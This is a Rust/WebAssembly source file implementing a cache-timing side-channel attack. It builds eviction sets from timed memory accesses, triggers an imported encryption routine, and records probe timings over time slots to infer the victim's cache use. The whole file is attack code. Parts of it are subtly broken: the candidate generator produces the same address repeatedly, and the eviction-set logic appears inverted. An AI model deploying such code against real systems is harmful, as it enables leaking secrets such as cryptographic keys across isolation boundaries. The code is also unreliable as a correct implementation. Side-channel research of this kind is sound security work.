use core::{hint::black_box, mem::ManuallyDrop};

use alloc::{boxed::Box, collections::LinkedList, vec::Vec};

use self::env::{random, timed_access, timed_hit};

const CACHE_LINE_SIZE: usize = 64;
const CACHE_ASSOCIATIVITY: usize = 12;

mod env {
    mod unsafe_js {
        #[link(wasm_import_module = "js")]
        extern "C" {
            pub fn random() -> f64;
            pub fn encrypt();
            pub fn log(value: u64);
        }
    }
    mod unsafe_wasm {
        #[link(wasm_import_module = "wasm")]
        extern "C" {
            pub fn get_time() -> u64;
            pub fn access(offset: u32);
            pub fn timed_access(offset: u32) -> u64;
            pub fn timed_hit(offset: u32) -> u64;
        }
    }

    pub fn random() -> f64 {
        unsafe { unsafe_js::random() }
    }
    pub fn encrypt() {
        unsafe { unsafe_js::encrypt() }
    }
    pub fn log(value: u64) {
        unsafe { unsafe_js::log(value) };
    }
    pub fn get_time() -> u64 {
        unsafe { unsafe_wasm::get_time() }
    }
    pub fn access(offset: u32) {
        unsafe { unsafe_wasm::access(offset) }
    }
    pub fn timed_access(offset: u32) -> u64 {
        unsafe { unsafe_wasm::timed_access(offset) }
    }
    pub fn timed_hit(offset: u32) -> u64 {
        unsafe { unsafe_wasm::timed_hit(offset) }
    }
}

#[inline(always)]
fn evict(eviction_set: &LinkedList<u32>) {
    eviction_set.iter().for_each(|offset| env::access(*offset));
}

#[inline(always)]
fn wait(number_of_cycles: u32) {
    let mut i = 0;
    while i < number_of_cycles {
        i += 1;
    }
}

#[inline(always)]
fn get_slow_time(eviction_set: &LinkedList<u32>, offset: u32) -> u64 {
    evict(eviction_set);
    timed_access(offset)
}

#[no_mangle]
pub fn generate_conflict_set(eviction_sets: &Vec<LinkedList<u32>>) -> LinkedList<u32> {
    eviction_sets.iter().flatten().cloned().collect()
}

#[no_mangle]
pub fn generate_eviction_set(
    probe: u32,
    candidate_set: &LinkedList<u32>,
    threshold: u64,
) -> LinkedList<u32> {
    let mut candidate_set = candidate_set.clone();
    let mut eviction_set: LinkedList<u32> = LinkedList::new();
    while let Some(random_offset) = candidate_set.pop_front() {
        if eviction_set.len() >= CACHE_ASSOCIATIVITY {
            break;
        }
        let mut new_eviction_set: LinkedList<u32> = eviction_set.clone();
        new_eviction_set.append(&mut candidate_set.clone());
        if threshold < get_slow_time(&new_eviction_set, probe) {
            eviction_set.push_back(random_offset);
        }
    }
    if candidate_set.len() == 0 {
        env::log(11111111);
        env::log(probe as u64);
        env::log(candidate_set.len() as u64);
        env::log(eviction_set.len() as u64);
        env::log(11111111);
    }
    env::log(22222222);
    eviction_set
}

#[no_mangle]
pub fn generate_candidate_set(target: &[u8]) -> LinkedList<u32> {
    let number_of_candidates = target.len() / CACHE_LINE_SIZE;
    let mut candidates: Vec<usize> = (0..number_of_candidates)
        .map(|i| (target.as_ptr() as usize) + (CACHE_LINE_SIZE))
        .collect();
    (0..number_of_candidates)
        .map(|_| {
            let index: usize = (env::random() * ((candidates.len() - 1) as f64)) as usize;
            candidates.swap_remove(index) as u32
        })
        .collect()
}

#[no_mangle]
pub extern "C" fn my_alloc(len: usize) -> *mut u8 {
    let align = core::mem::align_of::<usize>();
    let layout = unsafe { core::alloc::Layout::from_size_align_unchecked(len, align) };
    unsafe { alloc::alloc::alloc(layout) }
}

#[no_mangle]
pub extern "C" fn my_dealloc(ptr: *mut u8, len: usize) {
    let align = core::mem::align_of::<usize>();
    let layout = unsafe { core::alloc::Layout::from_size_align_unchecked(len, align) };
    unsafe { alloc::alloc::dealloc(ptr, layout) }
}

#[no_mangle]
pub extern "C" fn flush_reload(
    threshold: u32,
    time_slots: u32,
    wait_cycles: u32,
    time_slot_size: u32,
    probes: *mut u32,
    probe_size: usize,
    target: *mut u8,
    target_size: usize,
) -> Box<[u32]> {
    let target = unsafe { core::slice::from_raw_parts(target, target_size) };
    let probes = unsafe { core::slice::from_raw_parts(probes, probe_size) };

    let candidate_set: LinkedList<u32> = generate_candidate_set(target);
    let eviction_sets: Vec<LinkedList<u32>> = probes //config.probes
        .iter()
        .map(|offset| generate_eviction_set(*offset, &candidate_set, threshold as u64))
        .collect();
    let conflict_set: LinkedList<u32> = generate_conflict_set(&eviction_sets);
    env::encrypt();
    env::log(123);
    let results: Vec<u32> = (0..time_slots)
        .flat_map(|_| {
            let start = env::get_time();
            let time_slot_results: Vec<u32> =
                probes.iter().map(|p| timed_access(*p) as u32).collect();
            evict(&conflict_set);
            while env::get_time() - start < time_slot_size as u64 {
                wait(wait_cycles);
            }
            time_slot_results
        })
        .collect();
    env::log(123);
    let boxed: Box<[u32]> = results.into_boxed_slice();
    boxed
}
